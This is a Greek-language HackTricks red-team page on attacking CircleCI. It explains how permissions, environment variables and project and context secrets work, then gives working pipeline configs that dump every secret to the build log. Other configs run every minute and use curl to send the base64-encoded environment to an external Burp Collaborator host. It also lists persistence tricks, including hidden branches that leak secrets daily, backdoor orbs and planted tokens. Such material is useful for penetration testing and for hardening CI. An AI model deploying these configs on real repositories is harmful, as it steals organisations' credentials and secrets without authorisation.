# Ασφάλεια του CircleCI

<details>

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
{% endhint %}

## Βασικές Πληροφορίες

[**Το CircleCI**](https://circleci.com/docs/2.0/about-circleci/) είναι μια πλατφόρμα Συνεχούς Ολοκλήρωσης όπου μπορείτε να **ορίσετε πρότυπα** που υποδηλώνουν τι θέλετε να κάνει με κάποιον κώδικα και πότε να το κάνει. Με αυτόν τον τρόπο μπορείτε να **αυτοματοποιήσετε τις δοκιμές** ή τις **αναπτύξεις** απευθείας **από τον κύριο κλάδο του αποθετηρίου** σας, για παράδειγμα.

## Δικαιώματα

**Το CircleCI** **κληρονομεί τα δικαιώματα** από το github και το bitbucket που σχετίζονται με τον **λογαριασμό** που συνδέεται.\
Στις δοκιμές μου ελέγχθηκε ότι όσο έχετε **δικαιώματα εγγραφής στο αποθετήριο στο github**, θα μπορείτε να **διαχειριστείτε τις ρυθμίσεις του έργου στο CircleCI** (ορισμός νέων κλειδιών ssh, λήψη κλειδιών api έργου, δημιουργία νέων κλαδιών με νέες ρυθμίσεις CircleCI...).

Ωστόσο, χρειάζεται να είστε **διαχειριστής αποθετηρίου** για να **μετατρέψετε το αποθετήριο σε ένα έργο του CircleCI**.

## Μεταβλητές Περιβάλλοντος & Μυστικά

Σύμφωνα με [**τα έγγραφα**](https://circleci.com/docs/2.0/env-vars/) υπάρχουν διαφορετικοί τρόποι για **φόρτωση τιμών σε μεταβλητές περιβάλλοντος** μέσα σε ένα ροή εργασίας.

### Ενσωματωμένες μεταβλητές περιβάλλοντος

Κάθε εκτέλεση ενός εμπορεώματος από το CircleCI θα έχει πάντα [**συγκεκριμένες μεταβλητές περιβάλλοντος που έχουν οριστεί στα έγγραφα**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) όπως `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` ή `CIRCLE_USERNAME`.

### Καθαρό κείμενο

Μπορείτε να τις δηλώσετε σε καθαρό κείμενο μέσα σε μια **εντολή**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Μπορείτε να τα δηλώσετε σε καθαρό κείμενο μέσα στο **περιβάλλον εκτέλεσης**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Μπορείτε να τα δηλώσετε σε καθαρό κείμενο μέσα στο περιβάλλον **build-job**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Μπορείτε να τα δηλώσετε σε καθαρό κείμενο μέσα στο **περιβάλλον ενός container**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Μυστικά του Project

Αυτά είναι τα **μυστικά** που θα είναι προσβάσιμα μόνο από το **project** (από **οποιοδήποτε branch**).\
Μπορείτε να τα δείτε **δηλωμένα** στο _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (129).png>)

{% hint style="danger" %}
Η λειτουργία "**Εισαγωγή Μεταβλητών**" επιτρέπει την **εισαγωγή μεταβλητών από άλλα projects** σε αυτό.
{% endhint %}

### Μυστικά Πλαισίου

Αυτά είναι μυστικά που ισχύουν **σε ολόκληρο τον οργανισμό**. Από προεπιλογή, οποιοδήποτε αποθετήριο μπορεί να έχει πρόσβαση σε οποιοδήποτε μυστικό που αποθηκεύεται εδώ:

![](<../.gitbook/assets/image (123).png>)

{% hint style="success" %}
Ωστόσο, σημειώστε ότι μπορεί να επιλεγεί μια διαφορετική ομάδα (αντί για Όλα τα μέλη) για να δοθεί πρόσβαση στα μυστικά μόνο σε συγκεκριμένα άτομα.\
Αυτή είναι αυτή τη στιγμή μία από τις καλύτερες μεθόδους για να **αυξήσετε την ασφάλεια των μυστικών**, ώστε να μην επιτρέπετε σε όλους να τα αποκτήσουν πρόσβαση, αλλά μόνο σε μερικά άτομα.
{% endhint %}

## Επιθέσεις

### Αναζήτηση Κειμένου Καθαρών Μυστικών

Αν έχετε **πρόσβαση στο VCS** (όπως το github) ελέγξτε το αρχείο `.circleci/config.yml` κάθε αποθετηρίου σε κάθε branch και **αναζητήστε** πιθανά **κείμενα μυστικά** που αποθηκεύονται εκεί.

### Μεταβλητές Περιβάλλοντος & Απαρίθμηση Πλαισίων Μυστικών

Ελέγχοντας τον κώδικα μπορείτε να βρείτε **όλα τα ονόματα μυστικών** που χρησιμοποιούνται σε κάθε αρχείο `.circleci/config.yml`. Μπορείτε επίσης να πάρετε τα **ονόματα πλαισίων** από αυτά τα αρχεία ή να τα ελέγξετε στην ιστοσελίδα: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Εξαγωγή Μυστικών Έργου

{% hint style="warning" %}
Για να **εξάγετε ΟΛΑ** τα μυστικά του έργου και των πλαισίων, χρειάζεται να έχετε πρόσβαση **ΕΓΓΡΑΦΗΣ** σε μόνο ένα αποθετήριο σε ολόκληρο τον οργανισμό στο github (_και ο λογαριασμός σας πρέπει να έχει πρόσβαση στα πλαίσια, αλλά από προεπιλογή όλοι μπορούν να έχουν πρόσβαση σε κάθε πλαίσιο_).
{% endhint %}

{% hint style="danger" %}
Η λειτουργία "**Εισαγωγή Μεταβλητών**" επιτρέπει την **εισαγωγή μεταβλητών από άλλα projects** σε αυτό. Έτσι, ένας επιτιθέμενος θα μπορούσε να **εισαγάγει όλες τις μεταβλητές του έργου από όλα τα αποθετήρια** και στη συνέχεια **να εξάγει όλα μαζί**.
{% endhint %}

Όλα τα μυστικά του έργου είναι πάντα ορισμένα στο περιβάλλον των εργασιών, οπότε απλά καλώντας το περιβάλλον και κρυπτογραφώντας το σε base64 θα εξάγετε τα μυστικά στη **κονσόλα καταγραφής ιστορικού εργασιών**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
Αν **δεν έχετε πρόσβαση στη web κονσόλα** αλλά έχετε **πρόσβαση στο αποθετήριο** και γνωρίζετε ότι χρησιμοποιείται το CircleCI, μπορείτε απλά να **δημιουργήσετε ένα ροή εργασίας** που **ενεργοποιείται κάθε λεπτό** και που **αποστέλλει τα μυστικά σε μια εξωτερική διεύθυνση**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Διαρροή Μυστικών Πλαισίου

Πρέπει να **καθορίσετε το όνομα του πλαισίου** (αυτό θα διαρρεύσει επίσης τα μυστικά του έργου):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
Αν **δεν έχετε πρόσβαση στη web κονσόλα** αλλά έχετε **πρόσβαση στο αποθετήριο** και γνωρίζετε ότι χρησιμοποιείται το CircleCI, μπορείτε απλά να **τροποποιήσετε ένα ροή εργασίας** που **ενεργοποιείται κάθε λεπτό** και που **αποστέλλει τα μυστικά σε μια εξωτερική διεύθυνση**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Απλά δημιουργώντας ένα νέο αρχείο `.circleci/config.yml` σε ένα αποθετήριο **δεν είναι αρκετό για να ενεργοποιήσει μια κατασκευή στο circleci**. Πρέπει **να το ενεργοποιήσετε ως ένα έργο στην κονσόλα του circleci**.
{% endhint %}

### Απόδραση στο Cloud

Το **CircleCI** σας δίνει τη δυνατότητα να εκτελέσετε **τις κατασκευές σας στις μηχανές τους ή στις δικές σας**.\
Από προεπιλογή, οι μηχανές τους βρίσκονται στο GCP, και αρχικά δεν θα μπορείτε να βρείτε κάτι σχετικό. Ωστόσο, αν ένα θύμα εκτελεί τις εργασίες στις **δικές του μηχανές (πιθανώς, σε ένα περιβάλλον cloud)**, ενδέχεται να βρείτε ένα **σημείο τερματικού μεταδεδομένων cloud με ενδιαφέρουσες πληροφορίες**.

Σημειώστε ότι στα προηγούμενα παραδείγματα εκκινήθηκαν όλα μέσα σε ένα δοχείο docker, αλλά μπορείτε επίσης **να ζητήσετε να εκκινήσετε μια μηχανή VM** (η οποία ενδέχεται να έχει διαφορετικές άδειες cloud):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Ή ακόμα και ένα docker container με πρόσβαση σε ένα απομακρυσμένο υπηρεσία docker:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Μόνιμη παραμονή

* Είναι δυνατόν να **δημιουργήσετε** **διακριτικά χρήστη στο CircleCI** για πρόσβαση στα σημεία API με την πρόσβαση των χρηστών.
* _https://app.circleci.com/settings/user/tokens_
* Είναι δυνατόν να **δημιουργήσετε διακριτικά έργων** για πρόσβαση στο έργο με τις άδειες που δίνονται στο διακριτικό.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Είναι δυνατόν να **προσθέσετε κλειδιά SSH** στα έργα.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Είναι δυνατόν να **δημιουργήσετε έναν προγραμματισμένο χρόνο σε κρυμμένο κλαδί** σε ένα απροσδόκητο έργο που **διαρρέει** όλες τις **μεταβλητές περιβάλλοντος context** καθημερινά.
* Ή ακόμη και δημιουργήστε σε ένα κλαδί / τροποποιήστε ένα γνωστό job που θα **διαρρέει** όλα τα context και τα **μυστικά έργων** καθημερινά.
* Αν είστε ιδιοκτήτης στο github μπορείτε να **επιτρέψετε μη επαληθευμένες σφαίρες** και να διαμορφώσετε μία σε ένα job ως **πίσω πόρτα**
* Μπορείτε να βρείτε μια **ευπάθεια εισαγωγής εντολών** σε κάποια εργασία και να **εισάγετε εντολές** μέσω ενός **μυστικού** τροποποιώντας την τιμή του.
